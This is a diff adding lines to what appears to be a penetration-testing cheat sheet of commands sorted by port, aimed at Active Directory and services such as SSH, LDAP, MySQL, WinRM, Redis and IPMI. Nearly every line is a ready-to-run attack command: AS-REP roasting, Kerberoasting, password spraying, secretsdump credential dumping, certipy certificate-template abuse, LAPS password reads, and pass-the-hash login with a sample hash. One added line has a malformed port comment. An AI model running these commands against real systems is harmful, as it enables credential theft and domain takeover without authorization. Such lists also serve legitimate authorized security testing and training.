@@ -23,10 +23,11 @@ net rpc password "TargetUser" -U "contoso"/"pwned-user"%"St0ng123" -S "DC-IP-Her
 ftp $user@$rhost #21
 
 ### Port 22 (SSH)
-ssh $user@$rhost #22
+ssh -v $user@$rhost #22
 ssh $user@$rhost -i id_rsa #22
 
 ### Port 53 (DNS)
+qterminal -e "zsh -c 'dnsenum $domain; exec zsh'" & disown
 bloodhound-python -d $domain -u $user -p '$password' -c All #53
 bloodhound-python -d $domain -u $user -p '$password' -dc $computer_name.$domain --disable-autogc -c all #53
 bloodhound-python -d $domain -u $user -p '$password' -ns 192.168.1.5 --disable-autogc -c all #53
@@ -38,14 +39,18 @@ hydra -L /seclists/Usernames/Names/names.txt -p $password -u -f $rhost -s 43649 
 impacket-GetNPUsers $domain/$user #88
 impacket-GetNPUsers -request -dc-ip $rhost $domain/$user -outputfile $user-hash.asrep #88
 impacket-GetUserSPNs -request -dc-ip $rhost $domain/$user #88
+impacket-GetTGT $domain/$user:$password $88
 kerbrute passwordspray -d $shortdomain --dc $rhost users.txt $password #88
 impacket-secretsdump $shortdomain/$user@$rhost #445 88
+certipy find -u $user@$domain -p $password -dc-ip $rhost
+certipy req -u $user@$domain -p $password -dc-ip $rhost -template User -ca $ca_name
 
 ### Port 135 139 (RPC)
 rpcclient -U "$domain/$user%$password" $rhost
 rpcclient -U $domain/$user $rhost
 
 ### Port 389 (LDAP)
+ldapdomaindump -u $domain\\$user -p $password $rhost #389
 Edit> ldapsearch -v -x -D $user@$domain -w $password -b "DC=$shortdomain,DC=c0mmm" -H "ldap://$rhost" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd #389
 Run via Venv> python pyLAPS.py --action get -d "$domain" -u $user -p "$password" --dc-ip $rhost #389
 
@@ -59,6 +64,8 @@ mssqlclient -p 1433 -hashes LMHASH:NTHASH $shortdomain/$user:$password@192.168.1
 ### Port 3306 (MySQL)
 mysql -h $rhost -u $user #3306
 mysql -h $rhost -u root #3306 default no password
+mysql -h $rhost -u $user -p$password -e "show databases;"
+mysql -h $rhost -u $user -p$password -e "select user,host from mysql.user;"
 
 ### Port 5985 (WinRM)
 evil-winrm -i $rhost -u $user -p $password #5985
@@ -68,3 +75,8 @@ evil-winrm -i $rhost -u $user -H '19a3a7550ce8c505c2d4608' #5985
 
 ### Port 6379 (Redis)
 redis-cli -user $user -a $password -h $rhost #6379
+
+### IPMI (Port 623)
+nmap -sU -p623 --script ipmi-version -Pn $rhost
+ipmitool -I lanplus -H $rhost -U $user -P $password chassis status
+ipmitool -I lanplus -H $rhost -U $user -P $password user list
